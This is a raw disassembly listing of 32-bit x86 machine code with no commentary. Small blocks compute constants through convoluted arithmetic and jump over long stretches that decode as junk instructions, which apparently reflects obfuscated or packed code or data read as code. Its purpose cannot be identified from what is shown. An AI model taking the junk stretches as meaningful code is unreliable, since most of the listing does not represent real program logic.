  40cb30:	sbb    BYTE PTR [esi-0x5d2ef96f],0xec
  40cb37:	add    eax,0xb0a337db
  40cb3c:	daa    
  40cb3d:	jg     0x40cb82
  40cb3f:	fadd   QWORD PTR [ebx+0x2f84a708]
  40cb45:	(bad)  
  40cb46:	(bad)  
  40cb47:	jle    0x40caeb
  40cb49:	dec    esi
  40cb4a:	dec    esi
  40cb4b:	enter  0xb01d,0x35
  40cb4f:	loopne 0x40cb6a
  40cb51:	jmp    0x947dc676
  40cb56:	cmp    al,0xf8
  40cb58:	dec    eax
  40cb59:	sbb    DWORD PTR [edi+eax*4+0x53],eax
  40cb5d:	pop    ds
  40cb5e:	push   0x25e73ec2
  40cb63:	mov    ebx,0xf5c3f6a5
  40cb68:	in     eax,0xcf
  40cb6a:	mov    bh,0x7
  40cb6c:	pop    ds
  40cb6d:	dec    ecx
  40cb6e:	ret    
  40cb6f:	jmp    0x40cbe3
  40cb71:	cmp    al,0x10
  40cb73:	ins    BYTE PTR es:[edi],dx
  40cb74:	pop    edx
  40cb75:	or     dh,al
  40cb77:	pop    esp
  40cb78:	xor    bl,BYTE PTR ds:0xe3a01cfb
  40cb7e:	jns    0x40cbde
  40cb80:	xchg   edi,eax
  40cb81:	or     BYTE PTR [edx+eax*2+0x76aa9bb6],0x34
  40cb89:	adc    al,0xf1
  40cb8b:	cdq    
  40cb8c:	pop    ecx
  40cb8d:	xchg   ebp,eax
  40cb8e:	jmp    0x6b4b822d
  40cb93:	sub    esi,ebx
  40cb95:	mov    eax,ds:0x85363ae4
  40cb9a:	in     eax,0x98
  40cb9c:	sbb    sp,0x65
  40cba0:	fidivr WORD PTR [edx+ecx*4]
  40cba3:	fwait
  40cba4:	loop   0x40cb41
  40cba6:	xor    DWORD PTR [eax-0x3d23451b],edx
  40cbac:	pop    ss
  40cbad:	outs   dx,BYTE PTR ds:[esi]
  40cbae:	xor    DWORD PTR [eax-0x2ded643c],0x32808295
  40cbb8:	test   BYTE PTR ds:0x3a2a266e,bl
  40cbbe:	cmp    BYTE PTR [edi],bh
  40cbc0:	mov    cl,0x5c
  40cbc2:	lock push esi
  40cbc4:	cmp    dl,al
  40cbc6:	out    0xf0,al
  40cbc8:	sub    DWORD PTR [ebp+0x15],0xffffffc9
  40cbcc:	mov    BYTE PTR [ebx],cl
  40cbce:	not    eax
  40cbd0:	xlat   BYTE PTR ds:[ebx]
  40cbd1:	lock rol DWORD PTR [esi],0x7
  40cbd5:	xchg   edx,eax
  40cbd6:	out    dx,al
  40cbd7:	cwde   
  40cbd8:	and    dh,0xbc
  40cbdb:	add    ch,ah
  40cbdd:	mov    gs:0x21830f,al
  40cbe3:	add    BYTE PTR [eax],al
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x4226a0,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax+0x7e1b5f5f],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [esi+0x42],ah
  40cc79:	and    dh,bh
  40cc7b:	mov    al,0x3a
  40cc7d:	xchg   ebp,eax
  40cc7e:	xchg   ecx,eax
  40cc7f:	or     ecx,esp
  40cc81:	(bad)  
  40cc82:	call   0xafb09e47
  40cc87:	aas    
  40cc88:	pushf  
  40cc89:	push   ss
  40cc8a:	cs jbe 0x40cc7a
  40cc8d:	xor    al,0xf2
  40cc8f:	stc    
  40cc90:	ret    
  40cc91:	leave  
  40cc92:	fs add eax,0x3872bd70
  40cc98:	xchg   ebp,eax
  40cc99:	mov    eax,0x5e9efc8f
  40cc9e:	int    0xd0
  40cca0:	sar    DWORD PTR [esi+ecx*4+0x20161eaf],cl
  40cca7:	fcomp  DWORD PTR [esi+0x116ea821]
  40ccad:	mov    ds:0xd89498c1,al
  40ccb2:	add    edx,eax
  40ccb4:	rol    DWORD PTR [eax+0x7f],1
  40ccb7:	sub    DWORD PTR [ecx-0x21],0x51
  40ccbb:	xor    esi,ebp
  40ccbd:	xchg   esp,eax
  40ccbe:	mov    ds:0x85bcf316,al
  40ccc3:	sbb    cl,BYTE PTR [esi+0x60]
  40ccc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc7:	push   ss
  40ccc8:	inc    ebp
  40ccc9:	cli    
  40ccca:	in     eax,0x3f
  40cccc:	dec    edx
  40cccd:	push   ss
  40ccce:	pop    edx
  40cccf:	test   al,0x3f
  40ccd1:	sbb    al,0x41
  40ccd3:	shr    DWORD PTR [ebx],cl
  40ccd5:	mov    esi,0xb3747ba
  40ccda:	jmp    0xccd73ebe
  40ccdf:	sbb    al,0x8d
  40cce1:	push   ecx
  40cce2:	test   eax,0xcb96a273
  40cce7:	icebp  
  40cce8:	test   edx,edx
  40ccea:	mov    DWORD PTR [ecx+0x5c],eax
  40cced:	push   ebx
  40ccee:	fbstp  TBYTE PTR ss:[ecx-0x73]
  40ccf2:	mov    cl,BYTE PTR [ebx+0x18]
  40ccf5:	adc    al,0xbd
  40ccf7:	mov    ah,0x6c
  40ccf9:	xchg   BYTE PTR [eax+0x27780621],bh
  40ccff:	jmp    0xac6f22be
  40cd04:	stc    
  40cd05:	or     eax,0x22876330
  40cd0a:	push   ebp
  40cd0b:	sub    bh,BYTE PTR [eax-0x2562c15b]
  40cd11:	mov    dl,0x4c
  40cd13:	or     ebp,edx
  40cd15:	cmp    BYTE PTR [edx-0x78251f59],cl
  40cd1b:	fbld   TBYTE PTR [edi-0x5014b9b1]
  40cd21:	ror    DWORD PTR [ecx-0x2d28a9d1],1
  40cd27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd28:	jmp    0xc68e:0x2968c1c1
  40cd2f:	inc    esp
  40cd30:	addr16 aam 0x0
  40cd33:	iret   
  40cd34:	mov    ds:0x2195f290,eax
  40cd39:	pop    esi
  40cd3a:	push   cs
  40cd3b:	jne    0x40ccc7
  40cd3d:	mov    WORD PTR [ebx-0x6db96530],es
  40cd43:	(bad)  
  40cd44:	(bad)  
  40cd45:	jmp    0xeaf8:0x782bade6
  40cd4c:	ret    
  40cd4d:	push   esi
  40cd4e:	out    0x1f,eax
  40cd50:	jnp    0x40ccfe
  40cd52:	das    
  40cd53:	add    al,0x4d
  40cd55:	je     0x40ccea
  40cd57:	lock xchg edi,eax
  40cd59:	cwde   
  40cd5a:	icebp  
  40cd5b:	fwait
  40cd5c:	mov    dl,0x80
  40cd5e:	cwde   
  40cd5f:	add    al,0xf3
  40cd61:	inc    edx
  40cd62:	out    dx,al
  40cd63:	pop    edx
  40cd64:	loop   0x40cd37
  40cd66:	aaa    
  40cd67:	xor    al,0xc6
  40cd69:	test   DWORD PTR ds:[ebp+0x5d],edi
  40cd6d:	(bad)  [ebx-0x61530739]
  40cd73:	pop    es
  40cd74:	xchg   esi,eax
  40cd75:	pop    esi
  40cd76:	xchg   edx,eax
  40cd77:	jnp    0x40cd10
  40cd79:	ds movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40cd7c:	xor    eax,0x5090fa87
  40cd81:	xor    DWORD PTR [ecx],edx
  40cd83:	scas   eax,DWORD PTR es:[edi]
  40cd84:	push   edi
  40cd85:	jns    0x40cd37
  40cd87:	mov    edx,0x4cea67d4
  40cd8c:	rcr    DWORD PTR [edi-0xc9ff969],1
  40cd92:	dec    esp
  40cd93:	mov    edx,0x2f3afab2
  40cd98:	shl    BYTE PTR [ecx-0x74],1
  40cd9b:	push   0x66
  40cd9d:	xor    al,0x63
  40cd9f:	sub    DWORD PTR [ecx-0xfef0406],esp
  40cda5:	jl     0x40ce10
  40cda7:	scas   eax,DWORD PTR es:[edi]
  40cda8:	and    BYTE PTR ds:0x8f2d52f0,al
  40cdae:	shr    BYTE PTR ds:0x7720483a,1
  40cdb4:	sbb    cl,BYTE PTR [esi-0x50]
  40cdb7:	cmp    DWORD PTR [ebx+0x7],0x17
  40cdbb:	stos   BYTE PTR es:[edi],al
  40cdbc:	adc    BYTE PTR [esi-0x7f050c71],dl
  40cdc2:	pop    ds
  40cdc3:	pop    esp
  40cdc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc5:	add    DWORD PTR [ecx],eax
  40cdc7:	push   0xf661520d
  40cdcc:	inc    esi
  40cdcd:	hlt    
  40cdce:	add    esp,DWORD PTR [esi]
  40cdd0:	push   ebp
  40cdd1:	fdivr  st(7),st
  40cdd3:	xor    esp,DWORD PTR [ecx]
  40cdd5:	retf   0xf538
  40cdd8:	je     0x40ce12
  40cdda:	ss mov al,0xb8
  40cddd:	call   0x1a83:0xeaac3ac7
  40cde4:	cli    
  40cde5:	iret   
  40cde6:	jne    0x40ce0b
  40cde8:	xchg   al,ah
  40cdea:	pop    edx
  40cdeb:	cmp    bh,cl
  40cded:	fldenv [esi+0x3dcf0e8f]
  40cdf3:	(bad)  
  40cdf4:	std    
  40cdf5:	stos   BYTE PTR es:[edi],al
  40cdf6:	adc    al,0x30
  40cdf8:	pop    esp
  40cdf9:	cmp    cl,cl
  40cdfb:	add    al,0x86
  40cdfd:	cwde   
  40cdfe:	sub    DWORD PTR ds:0xb4410a0f,edx
  40ce04:	xchg   ecx,eax
  40ce05:	cmpxchg DWORD PTR [ebx+0x4a],eax
  40ce09:	mov    WORD PTR [ebp+0x57],ss
  40ce0c:	retf   
  40ce0d:	jmp    0x40ce46
  40ce0f:	mov    ebp,0x845efa93
  40ce14:	push   ecx
  40ce15:	and    ecx,esi
  40ce17:	adc    dh,bl
  40ce19:	retf   0x2bd8
  40ce1c:	pop    ss
  40ce1d:	jecxz  0x40cdc1
  40ce1f:	arpl   WORD PTR [ebp-0x153ae4e8],bx
  40ce25:	fsub   DWORD PTR [ecx-0x4e252feb]
  40ce2b:	xor    ecx,0xee44ce31
  40ce31:	int3   
  40ce32:	dec    ecx
  40ce33:	cwde   
  40ce34:	add    ax,0xb05d
  40ce38:	imul   ecx,DWORD PTR [eax+0xf],0x6c21f491
  40ce3f:	cmp    dh,BYTE PTR ds:0x8123b885
  40ce45:	cmp    BYTE PTR ds:0x3948d2b5,bh
  40ce4b:	psrld  mm6,QWORD PTR [esi+0x4b802731]
  40ce52:	inc    edx
  40ce53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce54:	xor    edi,DWORD PTR [edi]
  40ce56:	sbb    al,0x4
  40ce58:	push   ecx
  40ce59:	repnz sbb ebp,DWORD PTR [esi]
  40ce5c:	push   ebp
  40ce5d:	fdivp  st(1),st
  40ce5f:	ins    BYTE PTR es:[edi],dx
  40ce60:	inc    ecx
  40ce61:	std    
  40ce62:	sar    BYTE PTR [ebp-0x68],0xf1
  40ce66:	in     eax,dx
  40ce67:	dec    esp
  40ce68:	loope  0x40cdfe
  40ce6a:	push   ss
  40ce6b:	jp     0x40ce1e
  40ce6d:	jl     0x40cedd
  40ce6f:	jle    0x40cec3
  40ce71:	mov    ds:0xd0037eb6,eax
  40ce76:	xchg   ebp,eax
  40ce77:	pop    edi
  40ce78:	test   BYTE PTR [ebx+0x57d8489e],bl
  40ce7e:	inc    ebp
  40ce7f:	retf   
  40ce80:	cmp    ebp,DWORD PTR [eax-0x486faf77]
  40ce86:	into   
  40ce87:	mov    cs:0xf83e2473,eax
  40ce8d:	lock add al,0x2c
  40ce90:	dec    eax
  40ce91:	add    dh,dl
  40ce93:	div    DWORD PTR [ebp+0x43]
  40ce96:	(bad)  
  40ce97:	sahf   
  40ce98:	xchg   esp,eax
  40ce99:	inc    esp
  40ce9a:	je     0x40cea9
  40ce9c:	pushf  
  40ce9d:	pop    edi
  40ce9e:	popa   
  40ce9f:	push   ebp
  40cea0:	xchg   DWORD PTR [edi-0x7d],eax
  40cea3:	dec    eax
  40cea4:	jle    0x40ce95
  40cea6:	dec    esi
  40cea7:	aam    0x66
  40cea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceaa:	xor    eax,eax
  40ceac:	outs   dx,DWORD PTR ds:[esi]
  40cead:	scas   al,BYTE PTR es:[edi]
  40ceae:	in     eax,dx
  40ceaf:	jmp    DWORD PTR [ebx]
  40ceb1:	or     edx,ebx
  40ceb3:	inc    ecx
  40ceb4:	jg     0x40ce59
  40ceb6:	jbe    0x40ce58
  40ceb8:	mov    ebx,0x66de6a51
  40cebd:	adc    dl,ch
  40cebf:	pusha  
  40cec0:	pop    ds
  40cec1:	cmc    
  40cec2:	pop    ebx
  40cec3:	adc    DWORD PTR [esi+0x29],ecx
  40cec6:	daa    
  40cec7:	xlat   BYTE PTR ds:[ebx]
  40cec8:	xor    al,0xe8
  40ceca:	adc    eax,0xafb1b4dd
  40cecf:	lods   eax,DWORD PTR ds:[esi]
  40ced0:	push   ebp
  40ced1:	jae    0x40cef5
  40ced3:	test   DWORD PTR [edx-0xa],0x8085eae
  40ceda:	mov    esi,0xbe3cb964
  40cedf:	inc    esi
  40cee0:	push   ds
  40cee1:	sub    eax,0x5a002ded
  40cee6:	push   es
  40cee7:	xchg   ebx,eax
  40cee8:	xchg   DWORD PTR [ebx-0x556dc9d9],ecx
  40ceee:	adc    edi,DWORD PTR [eax*8-0x698f4e1e]
  40cef5:	leave  
  40cef6:	inc    edx
  40cef7:	xor    ch,BYTE PTR [esi+0x4c44e1fe]
  40cefd:	fs or  edx,edi
  40cf00:	inc    ebx
  40cf01:	sti    
  40cf02:	cmp    ch,BYTE PTR [ebp-0x38]
  40cf05:	shl    DWORD PTR [esi+0x48cfed32],cl
  40cf0b:	or     DWORD PTR [ebx-0x6],eax
  40cf0e:	test   eax,0x3685146d
  40cf13:	scas   al,BYTE PTR es:[edi]
  40cf14:	inc    esi
  40cf15:	cwde   
  40cf16:	test   eax,0x9de774e2
  40cf1b:	loop   0x40cea1
  40cf1d:	fisttp QWORD PTR [ebx-0x37d403bb]
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422598
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x4518bcd3],esi
  40cfad:	cmp    eax,0x18e872be
  40cfb2:	sbb    dl,dl
  40cfb4:	adc    al,0x18
  40cfb6:	sbb    al,al
  40cfb8:	lods   eax,DWORD PTR ds:[esi]
  40cfb9:	call   0x18ed:0x1aac71f6
  40cfc0:	cmp    esp,ecx
  40cfc2:	test   BYTE PTR [ecx+0x21c1669c],0xcd
  40cfc9:	push   ebx
  40cfca:	cmp    eax,0xba9be930
  40cfcf:	stos   BYTE PTR es:[edi],al
  40cfd0:	mov    edx,DWORD PTR [edx]
  40cfd2:	xchg   bl,cl
  40cfd4:	inc    ecx
  40cfd5:	repnz stos DWORD PTR es:[edi],eax
  40cfd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfd8:	(bad)  
  40cfd9:	add    al,0x57
  40cfdb:	jno    0x40cf9a
  40cfdd:	xchg   BYTE PTR [ebp+0x136de820],bl
  40cfe3:	(bad)  
  40cfe4:	push   ecx
  40cfe5:	dec    edi
  40cfe6:	mov    esi,0xcb1b9a64
  40cfeb:	pop    ds
  40cfec:	mov    edi,0x164f66f
  40cff1:	jb     0x40d04a
  40cff3:	push   0x9aa58c19
  40cff8:	addr16 out 0x1c,al
  40cffb:	lds    esp,FWORD PTR [esi-0x13]
  40cffe:	std    
  40cfff:	aad    0x28
  40d001:	stos   DWORD PTR es:[edi],eax
  40d002:	stos   BYTE PTR es:[edi],al
  40d003:	retf   0xd49d
  40d006:	xchg   ebx,eax
  40d007:	inc    ebx
  40d008:	pop    esi
  40d009:	add    eax,0x661822e8
  40d00e:	sbb    DWORD PTR [ecx-0x20dee02a],eax
  40d014:	and    dh,BYTE PTR [ebp-0x2c]
  40d017:	pop    edi
  40d018:	sbb    BYTE PTR [ebx],ah
  40d01a:	js     0x40d06b
  40d01c:	scas   al,BYTE PTR es:[edi]
  40d01d:	and    eax,0x9e201fb0
  40d022:	stc    
  40d023:	adc    eax,0xee66ba1f
  40d028:	mov    ecx,0x81f7d5f8
  40d02d:	and    DWORD PTR [edx],edi
  40d02f:	cmp    bl,al
  40d031:	iret   
  40d032:	pop    es
  40d033:	int    0xcd
  40d035:	ss fucom st(6)
  40d038:	ds add al,0x45
  40d03b:	dec    edi
  40d03c:	daa    
  40d03d:	icebp  
  40d03e:	out    0x42,al
  40d040:	mov    al,ds:0x329517e5
  40d045:	and    BYTE PTR [esi-0x434ce44],al
  40d04b:	popf   
  40d04c:	mov    ah,0x80
  40d04e:	js     0x40d084
  40d050:	fisttp WORD PTR [ecx-0x36]
  40d053:	dec    edi
  40d054:	das    
  40d055:	mov    ah,0x45
  40d057:	ret    
  40d058:	sbb    al,0xda
  40d05a:	jp     0x40cfdd
  40d05c:	xor    DWORD PTR [edx],eax
  40d05e:	jno    0x40d03e
  40d060:	add    dl,BYTE PTR [edi+0x408049f0]
  40d066:	(bad)  
  40d067:	sub    esi,esi
  40d069:	ins    DWORD PTR es:[edi],dx
  40d06a:	cmp    eax,0xfbf613c8
  40d06f:	and    al,0x86
  40d071:	xchg   esp,eax
  40d072:	adc    BYTE PTR [ebx],ah
  40d074:	adc    ecx,DWORD PTR [edi+0x57edfae0]
  40d07a:	sbb    BYTE PTR [ebx+0x7c],bh
  40d07d:	js     0x40d055
  40d07f:	mov    ebp,0x817cbfd5
  40d084:	mov    WORD PTR [esi+0x14],cs
  40d087:	das    
  40d088:	outs   dx,DWORD PTR ds:[esi]
  40d089:	(bad)  
  40d08a:	pop    ebx
  40d08b:	sub    al,0x59
  40d08d:	lock xor edx,ebx
  40d090:	and    eax,0xaaff9ce0
  40d095:	(bad)  
  40d096:	pop    esi
  40d097:	cmc    
  40d098:	pusha  
  40d099:	or     al,0x98
  40d09b:	jb     0x40d02f
  40d09d:	out    dx,eax
  40d09e:	mov    edx,0x48611047
  40d0a3:	jmp    0xe6102095
  40d0a8:	cmp    al,0x2f
  40d0aa:	lea    ebp,[eax-0x30]
  40d0ad:	test   BYTE PTR [eax],ch
  40d0af:	jge    0x40d0d2
  40d0b1:	push   ss
  40d0b2:	aam    0xdc
  40d0b4:	push   cs
  40d0b5:	sbb    BYTE PTR [eax],ch
  40d0b7:	mov    dl,0xa
  40d0b9:	adc    cl,bh
  40d0bb:	(bad)  
  40d0bd:	retf   0x66d1
  40d0c0:	repz or BYTE PTR [edx+0x697ce6db],bl
  40d0c7:	sti    
  40d0c8:	pop    ebp
  40d0c9:	mov    eax,ds:0xd3413101
  40d0ce:	inc    edx
  40d0cf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40d0d1:	jnp    0x40d0c6
  40d0d3:	cmp    eax,0xd012c9df
  40d0d8:	fcomp  st(6)
  40d0da:	sbb    esp,esi
  40d0dc:	xchg   ebp,eax
  40d0dd:	or     BYTE PTR [edi],cl
  40d0df:	loope  0x40d078
  40d0e1:	sbb    eax,0x5e04f18a
  40d0e6:	xchg   bh,bh
  40d0e8:	cmp    edx,DWORD PTR [edx+0x39496116]
  40d0ee:	push   0xfc6a53a2
  40d0f3:	add    al,0xd5
  40d0f5:	mov    WORD PTR [edx+0x75],cs
  40d0f8:	push   ss
  40d0f9:	sahf   
  40d0fa:	pop    es
  40d0fb:	or     eax,0x4e4ba80c
  40d100:	call   0x7f85:0x8c7553fc
  40d107:	adc    BYTE PTR [ecx+0x1b],bl
  40d10a:	add    ebx,eax
  40d10c:	cdq    
  40d10d:	sahf   
  40d10e:	adc    dh,ch
  40d110:	and    DWORD PTR [edx-0x647841a8],0x808c707
  40d11a:	cmp    eax,0x195ae5a1
  40d11f:	loopne 0x40d0a9
  40d121:	sub    al,BYTE PTR [ebx-0x60d63865]
  40d127:	push   ebp
  40d128:	pop    esp
  40d129:	lods   eax,DWORD PTR ds:[esi]
  40d12a:	add    DWORD PTR [edi-0x51a50759],esi
  40d130:	mov    al,dh
  40d132:	fld    st(5)
  40d134:	pop    eax
  40d135:	sbb    al,0x75
  40d137:	or     DWORD PTR [eax+0x4a],esi
  40d13a:	mov    al,ds:0x5b0af2c0
  40d13f:	xor    DWORD PTR [edi+0x300e76bb],ecx
  40d145:	rcl    DWORD PTR [ecx+0x32c074e3],1
  40d14b:	mov    bh,ah
  40d14d:	push   edi
  40d14e:	pusha  
  40d14f:	daa    
  40d150:	push   ss
  40d151:	dec    esp
  40d152:	or     BYTE PTR [edi+0x10524696],dl
  40d158:	ss cmp al,0x81
  40d15b:	jp     0x40d1d9
  40d15d:	mov    cl,0x3b
  40d15f:	mov    ?,WORD PTR [edx+0x41768f0a]
  40d165:	dec    esi
  40d166:	pop    ss
  40d167:	out    0x66,al
  40d169:	and    DWORD PTR [esi-0x4a843999],esp
  40d16f:	sbb    bh,dl
  40d171:	imul   esi,DWORD PTR [eax+0x66579dd1],0xffffff9e
  40d178:	dec    ecx
  40d179:	rol    edx,0x5
  40d17c:	mov    dl,0x39
  40d17e:	push   esp
  40d17f:	je     0x40d199
  40d181:	mul    esp
  40d183:	fisub  DWORD PTR [edi+0x1a8fffa8]
  40d189:	dec    ebx
  40d18a:	jno    0x40d178
  40d18c:	and    al,0xf9
  40d18e:	imul   esi,DWORD PTR [eax+0x3ea42f33],0x66f64d20
  40d198:	push   esi
  40d199:	adc    eax,0xb849ecda
  40d19e:	jo     0x40d138
  40d1a0:	push   ds
  40d1a1:	inc    esi
  40d1a2:	or     al,0x74
  40d1a4:	daa    
  40d1a5:	fisubr DWORD PTR [edi-0x13]
  40d1a8:	out    0x75,eax
  40d1aa:	jp     0x40d150
  40d1ac:	paddd  mm5,QWORD PTR [esi+0x6a11198d]
  40d1b3:	nop
  40d1b4:	dec    edx
  40d1b5:	xchg   ebx,eax
  40d1b6:	xchg   ecx,eax
  40d1b7:	cwde   
  40d1b8:	and    eax,DWORD PTR [ebx+0x54c2faa7]
  40d1be:	or     al,0x88
  40d1c0:	dec    ebp
  40d1c1:	xor    ch,cl
  40d1c3:	jnp    0x40d238
  40d1c5:	cmp    dh,ch
  40d1c7:	lahf   
  40d1c8:	clc    
  40d1c9:	es xor al,0x11
  40d1cc:	je     0x40d16c
  40d1ce:	in     al,dx
  40d1cf:	push   esi
  40d1d0:	and    BYTE PTR [esp+edi*4+0x31bd6378],bl
  40d1d7:	or     eax,0xc5acde7e
  40d1dc:	fptan  
  40d1de:	sbb    eax,0xbcf2231
  40d1e3:	aam    0xf5
  40d1e5:	cmc    
  40d1e6:	out    0x4c,al
  40d1e8:	xchg   BYTE PTR [esi],cl
  40d1ea:	call   0x59046093
  40d1ef:	jne    0xd1257d55
  40d1f5:	mov    ds:0x2265c56b,al
  40d1fa:	or     BYTE PTR [edi-0x4ce5e970],al
  40d200:	mov    cl,0x42
  40d202:	cwde   
  40d203:	inc    ecx
  40d204:	sbb    eax,0xb0968e53
  40d209:	or     eax,0x2b3b6076
  40d20e:	outs   dx,DWORD PTR ds:[esi]
  40d20f:	sub    eax,0xb80a84d8
  40d214:	cmp    BYTE PTR [ebx-0x14],dl
  40d217:	add    edi,DWORD PTR [edx+0x24]
  40d21a:	hlt    
  40d21b:	jl     0x40d1b2
  40d21d:	out    dx,eax
  40d21e:	retf   0x2558
  40d221:	test   cl,dh
  40d223:	fldenv ds:0x417b7119
  40d229:	adc    ebp,DWORD PTR [edx+0x7479003c]
  40d22f:	loop   0x40d291
  40d231:	push   es
  40d232:	sbb    eax,0xaa673e54
  40d237:	or     ah,BYTE PTR [ebx-0x80]
  40d23a:	push   ecx
  40d23b:	mov    eax,ds:0xde8f5611
  40d240:	dec    ecx
  40d241:	cmp    DWORD PTR [edx-0x7a68e16d],0x4d
  40d248:	inc    edx
  40d249:	out    dx,eax
  40d24a:	popf   
  40d24b:	push   0x28448e29
  40d250:	mov    edi,DWORD PTR [ebx]
  40d252:	scas   al,BYTE PTR es:[edi]
  40d253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d254:	ficomp DWORD PTR [edi+0x791506e3]
  40d25a:	mov    ebx,0x881219d6
  40d25f:	add    al,0xe
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	(bad)  
  40d2f3:	not    ecx
  40d2f5:	jo     0x40d324
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [esi],cl
  40d2ff:	push   0x3c9730f1
  40d304:	jl     0x40d349
  40d306:	jno    0x40d299
  40d308:	push   cs
  40d309:	sbb    al,0x9
  40d30b:	je     0x40d307
  40d30d:	mov    eax,0x715ce787
  40d312:	jo     0x40d2bf
  40d314:	jp     0x40d2f5
  40d316:	push   ebp
  40d317:	mov    eax,ds:0x286888f9
  40d31c:	push   esp
  40d31d:	inc    eax
  40d31e:	mov    WORD PTR [edx+eax*4+0x410aa1a4],es
  40d325:	mov    edi,0x6181262f
  40d32a:	nop
  40d32b:	ins    BYTE PTR es:[edi],dx
  40d32c:	rcr    DWORD PTR [ecx],1
  40d32e:	pop    ebx
